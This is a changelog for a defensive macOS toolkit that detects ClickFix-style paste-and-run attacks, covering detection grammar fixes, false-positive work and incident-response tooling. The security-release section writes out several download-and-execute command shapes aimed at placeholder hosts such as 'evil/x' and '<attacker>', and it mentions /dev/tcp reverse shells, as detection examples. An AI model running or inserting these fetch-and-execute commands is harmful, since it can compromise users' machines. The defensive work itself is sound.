# Changelog

All notable changes to the ClickFix Defense Kit are documented here.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [0.3.0] — 2026-07-29

### Added — DownloadTriage (7th tool)

ShellGuard guards the shell prompt. That is one execution path, and macOS has
many — a double-clicked `.command`, a `.pkg` preinstall running as **root**, an
`.app` inside a DMG, a `.scpt` in Script Editor. None touch a zsh prompt, so
none could be caught at `accept-line`. This closes the **deliver** stage.

- **`.pkg` install scripts are expanded and run through the shared grammar.**
  A package's `preinstall`/`postinstall` runs as root, and the user is
  *conditioned* to type an admin password into Installer.app — so GuestMode's
  "a phished password can't escalate" framing does not cover it. The escalation
  is the installer's documented behaviour. If a script would be blocked at your
  terminal, it is flagged in the installer too, and shown to you.
  `pkgutil --expand-full` unpacks; it never executes. A test asserts exactly
  that, using a fixture whose `postinstall` would create a marker file.
- Reports quarantine attribute (ABSENT on an executable means Gatekeeper will
  not inspect it at all), `kMDItemWhereFroms` origin URL checked against the
  grammar's malware-staging host list, and Gatekeeper verdict + signer.
- `.command`, `.terminal` and `.sh` contents are read through the grammar.
- DMGs are **not** mounted without `--mount`, because mounting is itself a
  delivery step in current campaigns.
- `--json` for scripting; exit `2` when something wants attention.

### Fixed — false positives found by running it on a real Downloads folder

- **An early build reported the official Signal installer as "REJECTED —
  unsigned."** `spctl -a` with no type argument assumes an executable, so it
  returns "no usable signature" for legitimate `.dmg` and `.zip` files. A tool
  that tells you Signal is unsigned is worse than no tool. Gatekeeper verdicts
  are now rendered only for `.app`, `.pkg` (with `-t install`) and Mach-O
  binaries. For a `.dmg` the tool says plainly that the signature lives on the
  app inside and was not checked.
- A malware-staging host on a non-executable (a `.txt` from a Discord CDN link)
  now warns rather than alarms.
- On a real 237-item Downloads folder this cut flagged items from 15 to 3.

### Fixed — shared grammar leaked variables into stdout

`local` re-declared inside a loop makes zsh echo `name=value`. `clickfix_check`
did this in three places, so `d=socat` and similar leaked into the stdout of
anything sourcing the grammar. Invisible in ShellGuard (which writes to
`/dev/tty`) and in the corpus runner (which reads only the verdict), but it
corrupted DownloadTriage's report. All loop-scoped locals are now declared once.

## [0.2.0] — 2026-07-29

The kit was born from a breach and, until this release, had nothing for the hour
after one. Repo-wide grep before this release: "revoke" 0 hits, "forwarding
rule" 0, "deploy key" 0, "reinstall" 0.

### Added — incident response

- **`INCIDENT.md`** — an ordered runbook, written to be worked from a phone.
  The ordering is the deliverable, not the content:
  - **Crypto first.** It is the only irreversible loss. A seed phrase *is* the
    wallet; "change the password" does nothing.
  - **Kill sessions BEFORE changing passwords.** This is the step people invert.
    A stolen cookie authenticates without the password and without 2FA, and a
    password change does not reliably invalidate live sessions — so resetting
    first and stopping there leaves the attacker signed in behind a new
    password. ExposureScan already knew this and the kit never turned it into a
    procedure.
  - Revoke OAuth grants (they survive every password change) → passwords, email
    first → mail-persistence sweep (forwarding, filters matching
    `reset`/`verify`/`code`, send-as aliases, delegated access, app-specific
    passwords, recovery address and phone).
  - Developer tokens in blast-radius order: npm/PyPI publish tokens **first**
    (a personal breach becomes a supply-chain breach), cloud keys
    disable-then-delete so the audit trail survives, then PATs, SSH/GPG, and
    per-repo deploy keys + Actions secrets — the most forgotten items, because
    there is no revoke-all button.
  - The reinstall decision as a bright line: *did anything get root?*
- **`panic.sh`** — prints the checklist with no network, no browser and no
  dependencies. `--short` fits a phone screen, `--paper` pipes to `lpr`,
  `--triage` adds read-only probes that answer the root question with facts.
  The ordered summary is hard-coded rather than parsed out of `INCIDENT.md`: if
  the repo is damaged, the order is the part you cannot afford to lose.
- **`preserve.sh`** — capture evidence before remediating. **Defers entirely to
  Jamf Aftermath when installed** — free, Swift, purpose-built, collects a
  superset. Built-in collector otherwise: 29 artifacts including
  `kMDItemWhereFroms` origin URLs for recent downloads, sha256 + `codesign`
  verdict per persistence plist, and TCC grants, sealed read-only with a
  MANIFEST.

### Added — ExposureScan

- **`scan_dev_credentials`** — SSH keys (plaintext vs encrypted, header-read
  only), 11 credential files by key name and mode, shell-history token counts by
  line number, per-profile cookie counts, crypto wallet stores (20 extensions +
  13 desktop bundles, unconditional P0), Firefox login counts so the report is
  not silently Chrome-shaped.
- **`--tcc`** — the grant inventory the README's central argument always implied
  and never delivered. P0 for terminals, shells, SSH wrappers and bare
  interpreters holding Full Disk Access / Accessibility / Screen Recording,
  because those are grant-inheritance vehicles rather than apps. Bundles Secure
  Keyboard Entry, remote-access services and Secure Boot level.
- **Deliberately not built:** FileVault, firewall, update settings, sudoers, the
  CIS sweep. mSCP and Pareto own that and own it better; they are cited instead.

### Fixed — WatchPost baseline could be blinded

- **Deleting `baseline.json` was treated as a first run.** The next run printed
  "No diffing on first run" and silently absorbed whatever had just been planted
  as legitimate. One `rm` permanently blinded the monitor. An `.armed` marker
  now makes deletion an alertable event that refuses to re-baseline without an
  explicit `--init`.
- **Editing the baseline directly is now detected** via an HMAC tag —
  pre-seeding it with an entry the attacker intends to create later would
  otherwise make the real plant diff as already-known.
- Baseline is **0600** in a **0700** directory; it was 0644 and enumerates every
  persistence entry on the machine.
- `--no-update` documented as *the* incident flag: a normal run promotes the
  baseline and erases the diff that proved something appeared.
- The README states the honest limit — the HMAC key sits beside the baseline
  under the same user, so this is tamper-**evidence**, not tamper-proofing. The
  root-owned variant that would be proof is named and explicitly not claimed.

### Tests

- `tests/test-watchpost-baseline.sh` — 10 checks covering all three blinding
  attacks, plus the one that matters most: a genuinely new plant is **still**
  reported after the hardening.
- ExposureScan 47 → **72** tests. `tests/make-sample-report.py` regenerates
  `sample-report.md` from the real scanner against a synthetic `$HOME`, with
  `--check` failing when stale — so "generated, not hand-written" is enforced
  rather than asserted.
- New macOS CI job for the baseline tests.

## [0.1.1] — 2026-07-29

**Security release. If you are running v0.1.0, upgrade.**

v0.1.0's detection grammar was adversarially tested for the first time and it
did not hold. Nine of thirteen realistic ClickFix payload shapes passed
ShellGuard **silently** — no prompt, no banner, nothing. ExposureScan's headline
privacy invariant was false for the highest-value secret class it ranks P0. And
ShellGuard's confirmation prompt could not actually be completed.

Every bypass is written up in [SECURITY.md](./SECURITY.md), and every one is now
a row in [`tests/corpus.tsv`](./tests/corpus.tsv) that fails the build if it ever
regresses. This project's whole pitch is refusing claims it cannot back, so it
publishes its own misses.

### Fixed — ShellGuard (detection)

- **The grammar is no longer regexes over a raw string.** Detection moved to a
  tokenizer in the new shared `lib/clickfix-grammar.zsh`, which respects
  quoting, splits into statements and pipeline stages, and normalizes each
  stage's command word before classifying it. Evading it now requires changing
  what the command *does*, not how it is spelled. Bypasses closed:
  - `curl "https://evil/x?a=1&b=2" | sh` — an ordinary `&` in a query string
    broke the `[^|;&]*` run, so **any URL with a query string was invisible**.
  - `curl https://evil/x | bash;` — one trailing character broke the
    `([[:space:]]|$)` anchor.
  - `curl https://evil/x | /bin/sh`, `| \sh`, `| 'sh'`, `| command sh`,
    `| env sh`, `| sudo -u nobody sh` — a path, a quote, a backslash or a
    prefix command defeated the bare-literal interpreter match.
  - `bash -c "$(curl -fsSL https://evil/x)"` — no pipe-to-interpreter shape at
    all, so nothing matched. This is the Homebrew-installer shape.
  - `$(curl https://evil/x)` — a bare command substitution with no `eval`.
  - `curl … | tee /tmp/p | sh`, `curl … | gunzip | bash` — an interposed stage.
  - `curl -o /tmp/p https://evil/x; sh /tmp/p` — download and execute split
    across two statements. Now detected at the `warn` tier.
  - `osascript -e 'do shell script "curl … | zsh"'` — the shape used by the
    `applescript://` Script Editor lure, which never touches a shell prompt.
  - `xxd -r`, `openssl enc -d`, `tr` and other non-base64 decoders.
- **`raw.githubusercontent.com` and `raw.github.com` removed from the default
  allowlist.** Any GitHub account can publish an arbitrary script to those
  hosts, so v0.1.0 was telling an attacker exactly where to stage a payload it
  would then wave through in silence. Trust is now scheme+host+**path prefix**
  (`raw.githubusercontent.com/ohmyzsh/` and friends), and the wildcard-subdomain
  trust rule is gone.
- **The allowlist can no longer waive the always-hostile rules.** v0.1.0 applied
  it uniformly after all patterns, which silently waived its own osascript rule
  — the one its source comment called "always hostile".
- Added a never-allowlistable high-risk staging host set (gist, Discord CDN,
  pastebin, IPFS, ngrok, transfer.sh …) that escalates the warning instead.
- Added detection for `xattr -c` / `-d com.apple.quarantine` (manually
  disarming Gatekeeper) and for `hdiutil attach` of a remote or `/tmp` disk
  image (the delivery step in current macOS stealer campaigns).
- Added detection for zero-width, bidi and Cyrillic/Greek look-alike characters
  in command position.

### Fixed — ShellGuard (the confirmation gate could not be completed)

- **`read -r < /dev/tty` inside a ZLE widget never returned.** While a widget
  runs, the line editor holds the terminal in raw mode with echo off: the user
  saw nothing as they typed, and because Enter sends CR (not LF) in raw mode,
  `read` waited forever. The typed-phrase gate — the entire point of the block
  tier — was not completable. It now uses zsh's `read-from-minibuffer`, with an
  `stty sane` save/restore fallback. Covered by a new pty-driven integration
  test that types into a real interactive zsh and checks a marker file to prove
  an aborted payload genuinely does not execute.
- The command is no longer printed raw into the warning banner. It is stripped
  of control characters and capped in height, so a payload cannot emit ANSI to
  scroll the warning off screen or paint a fake confirmation line into it.

### Fixed — false positives (an uninstalled guard catches nothing)

- Unquoted `#` comments are stripped before analysis, so
  `ls # dont run curl https://x | sh` no longer prompts — and a decoy trailing
  comment no longer suppresses ClipSentinel.
- `/dev/tcp` only fires when it appears **outside** a quoted string, or inside
  an interpreter's `-c` program. `git commit -m "note about /dev/tcp/h/9000"`
  no longer prompts.
- An inline `python -c` program now requires **both** a network primitive and an
  exec primitive. v0.1.0 fired on either alone, so
  `python3 -c "import os; os.system(1)"` was flagged with no network involved.
- `curl … | python3 -m json.tool` is downgraded to `warn` rather than blocked.
- **New `warn` tier**: banner plus a single Enter, for heuristics with real
  false-positive rates. The typed phrase is reserved for unambiguous attack
  shapes, so it does not become muscle memory.

### Fixed — ClipSentinel

- **A single token silenced the entire tool.** `_is_allowlisted` was a bare
  substring test against the whole clipboard buffer and its list contained
  `install.sh`, so `curl https://<attacker>/get4/install.sh | bash` — the shape
  in published AMOS IOCs — raised nothing. `bun.sh` likewise substring-matched
  `evil-bun.shop`, and appending `# deno.land` suppressed anything at all. A
  ClickFix page controls the exact clipboard bytes, so this was a guaranteed,
  attacker-chosen, total suppression.
- ClipSentinel and ShellGuard now share one grammar file. The v0.1.0 README
  claimed they were "kept in lockstep"; they disagreed on 6 of 13 payloads. CI
  now fails if either tool grows its own host list or detection regex again.
- The event log no longer records a preview of the copied text (which included
  the attacker URL) while the README promised contents were "never stored". It
  records the verdict, the reason, and a truncated hash — enough to correlate
  two events, never enough to recover the payload.

### Fixed — ExposureScan

- **The "architecturally incapable of emitting a secret value" claim was false.**
  A 12-word BIP-39 seed phrase passed `redact()` byte-identical (no unbroken
  20-character run, no `=`), as did `postgres://admin:hunter2@host/db` and
  `PIN 4821 / password hunter2`. `KEY = correct horse battery staple` emitted
  three of the four words *and* a literal `<redacted>` that made the line look
  sanitized.
- **Apple Notes titles were emitted verbatim, and Apple derives the title from
  the note's first line** — so for the exact user this surface exists for
  (someone who pasted a seed phrase into Notes) the secret *was* the title.
  Findings now carry `Note #id (title N chars, modified <date>)`.
- **PII filenames were emitted verbatim** into stdout, the markdown report and
  the JSON sidecar — a card number in a filename was reproduced and annotated
  `credit-card: 1`. Now withheld behind a hash.
- **Seed-phrase *detection* only matched the label** ("seed phrase",
  "mnemonic"). A note containing nothing but the twelve words — the actual
  catastrophic case — was never flagged at all.
- Ships the 2048-word BIP-39 list; redaction triggers at ≥6 consecutive
  wordlist tokens, detection at ≥11.
- Control characters, ANSI escapes and markdown metacharacters are neutralised,
  so a crafted filename or note title can no longer inject a forged finding
  into the report.
- `shutil.copy2` → `copyfile` + explicit `chmod 0600`: `copystat` was widening
  the temp copy of browser Login Data back to the source's 0644.
- Temp database copies are now removed on exception, SIGINT, SIGTERM and
  SIGHUP instead of being orphaned in `TMPDIR`.
- `--out`/`--json` are written 0600 and atomically; the README no longer
  demonstrates writing a credential map to `/tmp`.
- Dropped `immutable=1`, which made SQLite ignore the `-wal` file the code went
  to the trouble of copying — silently under-counting the most recent logins and
  cookies in a report whose entire output is a risk score.

### Fixed — Canary

- **`canary --list` crashed on any non-empty ledger.** It read the field into
  `_kind` and printed `$kind`, and under `set -u` that aborted with
  `kind: unbound variable`. The advertised audit command had never worked, so
  nobody had ever successfully reviewed a plant — including the missing-decoy
  check that is itself a breach signal.

### Added

- `lib/clickfix-grammar.zsh` — the shared, tokenizer-based detection grammar.
- `tests/corpus.tsv` — 78 asserted payload/verdict rows, including every
  v0.1.0 bypass and every known false positive.
- `tests/run-corpus.zsh` — corpus runner plus the anti-drift assertion.
- `tests/test-zle-integration.zsh` — drives a real interactive zsh over a pty.
- `exposurescan/tests/test_invariant.py` — 35 new tests, including end-to-end
  scan→render→sidecar assertions that no secret reaches any artifact.
- CI now runs the corpus and the pty integration test on **macOS** runners.

## [Unreleased]

### Added
- CI on every push and pull request: ShellCheck (warning severity) over the bash
  scripts, a real `zsh -n` parse for the three zsh scripts ShellCheck cannot read,
  and the ExposureScan redaction invariant suite.
- CI, license, platform, and release badges in the README.

### Fixed
- `canary-gen.sh`: redundant `case` patterns that shadowed each other
  (`*/.aws` was already covered by `*.aws`; same for Desktop and Documents).
  No behaviour change.
- `canary-gen.sh`: unused loop variables in the revert ledger read.
- `shellguard/install.sh`: split `local backup=...$(date)` so a failing `date`
  cannot be masked by `local`'s exit status.

## [0.1.0] - 2026-05-31

Initial public release. Six independent, defensive tools plus a top-level
interactive installer, assembled into a defense-in-depth kit for solo developers,
freelancers, and families on a single Mac.

### Added

- **ShellGuard** — zsh ZLE `accept-line` command guard. Intercepts
  download/decode-and-execute commands (`curl|sh`, `eval $(curl)`,
  `base64 -d | sh`, `osascript | sh`, `/dev/tcp` reverse shells) at execute time
  and forces a typed confirmation phrase. Chains to existing `accept-line`
  widgets (syntax-highlighting, autosuggestions, oh-my-zsh) instead of clobbering
  them. Trusted-host allowlist and per-session disable for false-positive
  tuning. Bracketed-paste advisory warning. Zero dependencies, no network.
- **ExposureScan** — local, read-only secret + PII blast-radius self-audit for
  macOS. Inventories four credential/PII surfaces (browser logins, Apple Notes,
  `.env` files, `~/.secrets`) plus PII markers, and prints a prioritized
  (P0–P3) blast-radius report. **Names and counts only — secret values are never
  read, decrypted, stored, or printed**, an invariant enforced by a `redact()`
  chokepoint and covered by a CI test. Python 3.11+ stdlib only. JSON sidecar for
  week-over-week diffing.
- **ClipSentinel** — dependency-free macOS clipboard watchdog. Fires a
  notification the instant a dangerous command lands on the clipboard (copy-time
  early warning), using a change-gated `pbpaste` poll. Allowlist for trusted
  installer one-liners. Argv-passed (injection-safe) `osascript` notifications.
- **Canary** — honeytoken tripwire generator. Plants traceable decoy credentials
  (fake AWS keys, `.env`, `passwords.txt`) where infostealers grab them, with a
  walkthrough to wire them to canarytokens.org (network callback) and/or
  `eslogger` (local read-watch). Ships token-minting code and decoy templates
  only — **never any minted/live tokens**. Ledger + revert; refuses to overwrite
  real files.
- **WatchPost** — zero-dependency macOS persistence + login-item change monitor.
  Baselines LaunchAgents, LaunchDaemons, cron, and login items, then diffs on a
  schedule and notifies on new/tampered entries with a `codesign` verdict.
  Designed for unattended/headless Macs where an interactive prompt can't reach
  you. Alerts on additions and tampering, not removals.
- **GuestMode** — family-safe non-admin macOS account setup. Dry-run-by-default
  script (two gates + typed `CREATE` to mutate) plus a fully documented manual
  path, creating a standard (non-admin) account so a phished password can't
  escalate and a guest can't read your home directory. Stock-macOS blast-radius
  reduction layer.
- **Top-level `install.sh`** — interactive menu installer/uninstaller that can
  install each tool individually; idempotent; with an uninstall path. No
  `curl | bash` delivery, on purpose.
- **Project docs** — `README.md` (origin story + threat explainer + tools table +
  permissions rationale + honest positioning), `LICENSE` (Apache 2.0),
  `SECURITY.md` (responsible use + reporting), `CONTRIBUTING.md`, `.gitignore`
  (defensive secret/PII exclusions).

### Security / positioning notes

- The differentiated novelty is **ExposureScan** (value-absent, blast-radius
  self-audit that inverts the find-and-print-the-value posture) and
  **ShellGuard** (execute-time zsh grammar gate on an otherwise-unoccupied macOS
  control point). WatchPost, the Canary network-callback half, and GuestMode
  intentionally defer to and point at prior art (Objective-See, Thinkst
  Canarytokens, stock macOS) — see `README.md`.
- Apache 2.0 throughout. The kit shells out to external tools (e.g. Gitleaks)
  rather than vendoring them, and deliberately does not copy any AGPL/GPL code
  (notably it does not vendor TruffleHog).

[0.1.0]: https://github.com/DareDev256/clickfix-defense-kit/releases/tag/v0.1.0
